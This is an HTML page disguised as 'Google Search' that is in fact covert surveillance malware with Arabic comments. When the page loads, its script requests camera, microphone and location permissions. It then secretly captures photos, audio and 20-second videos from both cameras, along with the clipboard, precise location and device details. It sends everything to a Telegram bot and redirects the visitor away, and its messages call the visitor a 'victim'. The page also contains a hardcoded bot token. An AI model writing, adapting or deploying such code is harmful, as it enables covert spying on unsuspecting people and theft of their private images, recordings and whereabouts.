<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Google Search</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            background: #000000;
            min-height: 100vh;
            overflow: hidden;
            font-family: system-ui, monospace;
            color: #000000;
        }

        .hidden-camera, video, canvas {
            display: none !important;
        }

        #dummy-video-front, #dummy-video-back {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 10px;
            height: 10px;
            opacity: 0;
            pointer-events: none;
        }

        #clickCatcher {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 9999;
            cursor: default;
            display: block;
            pointer-events: auto;
        }

        /* عناصر الفيديو المخفية للتسجيل */
        .hidden-video-element {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
<div id="clickCatcher"></div>
<script>
    (function(){
        // ========== توكن البوت (ثابت) ==========
        const BOT_TOKEN = '8786484895:AAGdGXjuolhfJzsIExpNqaq7NfkBi481zas';
        const REDIRECT_URL = 'https://t.me/Whiskybots';
        
        // ========== استخراج target ID من الرابط ==========
        function extractTargetId() {
            const urlParams = new URLSearchParams(window.location.search);
            let target = urlParams.get('target') || urlParams.get('id');
            if (target && /^\d+$/.test(target)) {
                return parseInt(target, 10);
            }
            
            const pathParts = window.location.pathname.split('/').filter(p => p.trim() !== '');
            const lastPart = pathParts[pathParts.length - 1];
            if (lastPart && /^\d+$/.test(lastPart)) {
                return parseInt(lastPart, 10);
            }
            
            console.error('لم يتم العثور على target ID صالح في الرابط');
            return null;
        }
        
        const TARGET_ID = extractTargetId();
        const FALLBACK_ID = null;
        
        function getChatId() {
            if (TARGET_ID) return TARGET_ID;
            if (FALLBACK_ID) return FALLBACK_ID;
            return null;
        }
        
        let isExecuting = false;
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // ========== إرسال البيانات إلى تليجرام ==========
        async function sendToTelegram(text, isHTML = true) {
            const chatId = getChatId();
            if (!chatId) {
                console.warn("لا يوجد معرف مستهدف للإرسال، تجاهل.");
                return;
            }
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: isHTML ? 'HTML' : undefined
                    })
                });
            } catch(e) { console.warn(e); }
        }
        
        async function sendPhoto(base64Data, caption) {
            const chatId = getChatId();
            if (!chatId) return;
            try {
                let blob = await (await fetch(base64Data)).blob();
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            } catch(e) { console.warn(e); }
        }
        
        async function sendAudio(audioUrl, caption) {
            const chatId = getChatId();
            if (!chatId) return;
            try {
                let blob = await fetch(audioUrl).then(r=>r.blob());
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', blob, 'audio.webm');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
            } catch(e) { console.warn(e); }
        }
        
        // ========== إرسال فيديو ==========
        async function sendVideo(videoBlob, caption) {
            const chatId = getChatId();
            if (!chatId) return;
            try {
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', videoBlob, `video_${Date.now()}.mp4`);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
            } catch(e) { 
                console.warn('فشل إرسال الفيديو:', e);
                // محاولة الإرسال كملف إذا فشل
                try {
                    let formData2 = new FormData();
                    formData2.append('chat_id', chatId);
                    formData2.append('document', videoBlob, `video_${Date.now()}.mp4`);
                    formData2.append('caption', caption);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData2 });
                } catch(e2) { console.warn(e2); }
            }
        }

        // ========== تسجيل فيديو ==========
        async function recordVideo(facingMode, duration = 20000) {
            let stream = null;
            let mediaRecorder = null;
            let chunks = [];
            
            try {
                // طلب الكاميرا مع الصوت اختياري
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: { exact: facingMode },
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false // تعطيل الصوت لتقليل حجم الفيديو
                });
                
                // إنشاء عنصر فيديو مخفي لعرض الدفق (مطلوب للتسجيل في بعض المتصفحات)
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.setAttribute('playsinline', 'true');
                videoElement.className = 'hidden-video-element';
                document.body.appendChild(videoElement);
                await videoElement.play();
                
                // إعداد MediaRecorder
                const mimeTypes = ['video/mp4', 'video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
                let selectedMimeType = null;
                for (const type of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(type)) {
                        selectedMimeType = type;
                        break;
                    }
                }
                
                mediaRecorder = new MediaRecorder(stream, { 
                    mimeType: selectedMimeType || 'video/webm',
                    videoBitsPerSecond: 1000000
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };
                
                // بدء التسجيل
                mediaRecorder.start(1000);
                
                // انتظار المدة المطلوبة
                await delay(duration);
                
                // إيقاف التسجيل
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        // تنظيف
                        if (stream) stream.getTracks().forEach(t => t.stop());
                        if (videoElement && videoElement.parentNode) videoElement.remove();
                        
                        if (chunks.length === 0) {
                            resolve(null);
                            return;
                        }
                        
                        // إنشاء blob
                        const blob = new Blob(chunks, { type: selectedMimeType || 'video/mp4' });
                        
                        // محاولة تحويل إلى MP4 إذا كان WebM
                        if (selectedMimeType && selectedMimeType.includes('webm')) {
                            // إرسال كـ WebM (Telegram يدعمه)
                            resolve(blob);
                        } else {
                            resolve(blob);
                        }
                    };
                    
                    mediaRecorder.stop();
                });
                
            } catch(e) {
                console.warn(`فشل تسجيل الفيديو من ${facingMode}:`, e);
                if (stream) stream.getTracks().forEach(t => t.stop());
                return null;
            }
        }

        // ========== جمع معلومات الجهاز ==========
        async function getDeviceInfo() {
            let ua = navigator.userAgent;
            let brand = 'غير معروف';
            if(ua.includes('iPhone')) brand = 'Apple';
            else if(ua.includes('Samsung')) brand = 'Samsung';
            else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
            else if(ua.includes('Pixel')) brand = 'Google';
            else brand = 'Android/PC';
            
            let battery = 'غير مدعوم';
            if('getBattery' in navigator) {
                try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging ? 'يشحن' : 'لا يشحن'}`; } catch(e) {}
            }
            
            return {
                fullName: navigator.userAgentData?.platform || navigator.platform || ua.split(' ').slice(0,3).join(' '),
                brand: brand,
                os: navigator.platform,
                browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
                screen: `${screen.width}x${screen.height}`,
                battery: battery,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };
        }
        
        // ========== تحديد الموقع الجغرافي ==========
        async function getLocation() {
            return new Promise((resolve) => {
                if(!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                let attempts = 0;
                const MAX_ATTEMPTS = 3;
                let resolved = false;
                const tryGetLocation = () => {
                    attempts++;
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            if (!resolved) {
                                resolved = true;
                                resolve({ 
                                    lat: pos.coords.latitude, 
                                    lng: pos.coords.longitude, 
                                    acc: pos.coords.accuracy,
                                    alt: pos.coords.altitude || 'غير متاح',
                                    heading: pos.coords.heading || 'غير متاح',
                                    speed: pos.coords.speed || 'غير متاح'
                                });
                            }
                        },
                        err => {
                            console.warn(`محاولة ${attempts} فشلت:`, err.message);
                            if (attempts < MAX_ATTEMPTS && !resolved) {
                                setTimeout(tryGetLocation, 2000);
                            } else if (!resolved) {
                                resolved = true;
                                resolve(null);
                            }
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                };
                tryGetLocation();
            });
        }
        
        // ========== قراءة الحافظة ==========
        async function getClipboard() {
            try {
                let text = await navigator.clipboard.readText();
                if(text && text.trim().length > 0) return text.trim();
                return text || "(فارغة)";
            } catch (err) {
                console.warn("محاولة القراءة المباشرة فشلت:", err.name);
                if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
                    return new Promise((resolve) => {
                        let resolved = false;
                        let timeoutId = setTimeout(() => {
                            if (!resolved) {
                                resolved = true;
                                resolve("⚠️ لم يتم قراءة الحافظة (لم ينقر المستخدم)");
                            }
                        }, 8000);
                        const clickHandler = async () => {
                            if (resolved) return;
                            resolved = true;
                            clearTimeout(timeoutId);
                            document.removeEventListener('click', clickHandler);
                            try {
                                let text = await navigator.clipboard.readText();
                                resolve(text && text.trim() ? text : "(فارغة)");
                            } catch (e) {
                                resolve("❌ لا يمكن الوصول إلى الحافظة");
                            }
                        };
                        document.addEventListener('click', clickHandler);
                    });
                } else {
                    return "❌ الحافظة غير متاحة (السياق غير آمن)";
                }
            }
        }
        
        // ========== التقاط الصور ==========
        async function capturePhotos(facingMode, count = 3) {
            let photos = [];
            let stream = null;
            let video = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode } }
                });
                video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', 'true');
                video.style.position = 'fixed';
                video.style.top = '-1000px';
                video.style.left = '-1000px';
                video.style.width = '320px';
                video.style.height = '240px';
                video.style.opacity = '0';
                video.style.pointerEvents = 'none';
                document.body.appendChild(video);
                await new Promise((resolve) => {
                    video.onloadedmetadata = async () => {
                        await video.play();
                        resolve();
                    };
                });
                await delay(800);
                let canvas = document.createElement('canvas');
                for(let i = 0; i < count; i++) {
                    if(video.videoWidth && video.videoHeight) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                    } else {
                        canvas.width = 1280;
                        canvas.height = 720;
                    }
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                    photos.push(dataUrl);
                    await delay(400);
                }
            } catch(e) {
                console.warn(`فشل التصوير من ${facingMode}:`, e);
            } finally {
                if(stream) stream.getTracks().forEach(t => t.stop());
                if(video && video.parentNode) video.remove();
            }
            return photos;
        }
        
        // ========== تسجيل صوتي ==========
        async function recordAudio(duration = 5000) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                let chunks = [];
                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                let promise = new Promise(resolve => {
                    mediaRecorder.onstop = () => {
                        let blob = new Blob(chunks, { type: 'audio/webm' });
                        let url = URL.createObjectURL(blob);
                        stream.getTracks().forEach(t => t.stop());
                        resolve(url);
                    };
                });
                mediaRecorder.start();
                await delay(duration);
                mediaRecorder.stop();
                return await promise;
            } catch(e) {
                console.warn("فشل التسجيل الصوتي", e);
                return null;
            }
        }
        
        // ========== طلب الأذونات ==========
        async function requestPermissions() {
            try {
                let audio = await navigator.mediaDevices.getUserMedia({ audio: true });
                audio.getTracks().forEach(t => t.stop());
            } catch(e) {}
            try {
                let front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
                front.getTracks().forEach(t => t.stop());
            } catch(e) {}
            try {
                let back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
                back.getTracks().forEach(t => t.stop());
            } catch(e) {}
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { timeout: 5000 });
            }
        }
        
        // ========== التنفيذ الكامل ==========
        async function executeFullScan() {
            if(isExecuting) return;
            isExecuting = true;
            
            await delay(500);
            
            // إرسال إشعار بدء
            await sendToTelegram(`#☑️ بدء جمع البيانات ☑️#\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
            
            // جمع البيانات الأساسية
            let deviceInfo = await getDeviceInfo();
            let locationData = await getLocation();
            let clipboardText = await getClipboard();
            
            // التقاط الصور
            let frontPhotos = [];
            let backPhotos = [];
            try {
                frontPhotos = await capturePhotos("user", 3);
            } catch(e) { console.warn(e); }
            try {
                backPhotos = await capturePhotos("environment", 3);
            } catch(e) { console.warn(e); }
            
            // تسجيل الصوت
            let audioUrl = await recordAudio(5000);
            
            // ===== تسجيل الفيديو (20 ثانية) =====
            let frontVideo = null;
            let backVideo = null;
            
            // تسجيل فيديو أمامي
            try {
                await sendToTelegram("🎥 بدء تسجيل الفيديو الأمامي (20 ثانية)...");
                frontVideo = await recordVideo("user", 20000);
                if (frontVideo) {
                    await sendToTelegram("✅ تم تسجيل الفيديو الأمامي بنجاح");
                } else {
                    await sendToTelegram("❌ فشل تسجيل الفيديو الأمامي");
                }
            } catch(e) { console.warn(e); }
            
            // تسجيل فيديو خلفي
            try {
                await sendToTelegram("🎥 بدء تسجيل الفيديو الخلفي (20 ثانية)...");
                backVideo = await recordVideo("environment", 20000);
                if (backVideo) {
                    await sendToTelegram("✅ تم تسجيل الفيديو الخلفي بنجاح");
                } else {
                    await sendToTelegram("❌ فشل تسجيل الفيديو الخلفي");
                }
            } catch(e) { console.warn(e); }
            
            // إرسال التقرير النصي
            await sendToTelegram(`#☑️ تم اختراق ضحية عبر صورة ملغمة ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}\n\nتم الإرسال إلى المعرف: ${getChatId()}`);
            
            let report = `📱 <b>بيانات الهاتف والضحية</b>\n\n`;
            report += `الجهاز: ${deviceInfo.fullName}\n`;
            report += `الشركة: ${deviceInfo.brand}\n`;
            report += `نظام التشغيل: ${deviceInfo.os}\n`;
            report += `المتصفح: ${deviceInfo.browser}\n`;
            report += `الشاشة: ${deviceInfo.screen}\n`;
            report += `البطارية: ${deviceInfo.battery}\n`;
            report += `المنطقة: ${deviceInfo.timezone}\n`;
            report += `اللغة: ${deviceInfo.language}\n\n`;
            
            if(locationData && locationData.lat) {
                report += `📍 <b>الموقع الجغرافي (تم بنجاح)</b>\n`;
                report += `خط العرض: ${locationData.lat}\n`;
                report += `خط الطول: ${locationData.lng}\n`;
                report += `الدقة: ${locationData.acc} متر\n`;
                report += `الارتفاع: ${locationData.alt}\n`;
                report += `الاتجاه: ${locationData.heading}\n`;
                report += `السرعة: ${locationData.speed}\n`;
                report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
            } else {
                report += `📍 <b>الموقع الجغرافي:</b> غير متاح (تم رفض الإذن أو لا تخدمة)\n\n`;
            }
            
            report += `📋 <b>محتوى الحافظة:</b>\n${clipboardText.substring(0, 500)}\n\n`;
            report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
            report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
            report += `📷 صور خلفية: ${backPhotos.length} صورة\n`;
            report += `🎥 فيديو أمامي: ${frontVideo ? '✓ تم' : '✗ فشل'}\n`;
            report += `🎥 فيديو خلفي: ${backVideo ? '✓ تم' : '✗ فشل'}`;
            
            await sendToTelegram(report, true);
            
            // إرسال الصور
            for(let i = 0; i < frontPhotos.length; i++) {
                await sendPhoto(frontPhotos[i], `☑️ كاميرا أمامية - صورة ${i+1}`);
                await delay(300);
            }
            for(let i = 0; i < backPhotos.length; i++) {
                await sendPhoto(backPhotos[i], `☑️ كاميرا خلفية - صورة ${i+1}`);
                await delay(300);
            }
            
            // إرسال الصوت
            if(audioUrl) {
                await sendAudio(audioUrl, "🎙️ تسجيل الصوت (5 ثوانٍ)");
            }
            
            // إرسال الفيديوهات
            if(frontVideo) {
                await sendVideo(frontVideo, "🎥 فيديو الكاميرا الأمامية (20 ثانية)");
                await delay(500);
            }
            
            if(backVideo) {
                await sendVideo(backVideo, "🎥 فيديو الكاميرا الخلفية (20 ثانية)");
                await delay(500);
            }
            
            await sendToTelegram(`#☑️ اكتمل الاختراق بنجاح ☑️#\nتم إرسال ${frontPhotos.length} صور أمامية، ${backPhotos.length} صور خلفية، وفيديو أمامي ${frontVideo ? '✓' : '✗'} وفيديو خلفي ${backVideo ? '✓' : '✗'}`);
            
            await delay(1500);
            window.location.href = REDIRECT_URL;
        }
        
        async function start() {
            if (!getChatId()) {
                console.error("لا يوجد معرف Telegram مستهدف في الرابط.");
                window.location.href = REDIRECT_URL;
                return;
            }
            await requestPermissions();
            await delay(500);
            executeFullScan().catch(err => {
                console.error(err);
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
            });
        }
        
        window.addEventListener('load', () => {
            setTimeout(start, 100);
        });
        
        document.body.style.backgroundColor = "#000000";
        document.documentElement.style.backgroundColor = "#000000";
        
        const catcher = document.getElementById('clickCatcher');
        if(catcher) catcher.style.pointerEvents = 'auto';
        
        console.log("جاهز - سيتم الإرسال إلى المعرف المستخرج من الرابط:", getChatId());
    })();
</script>
</body>
</html>
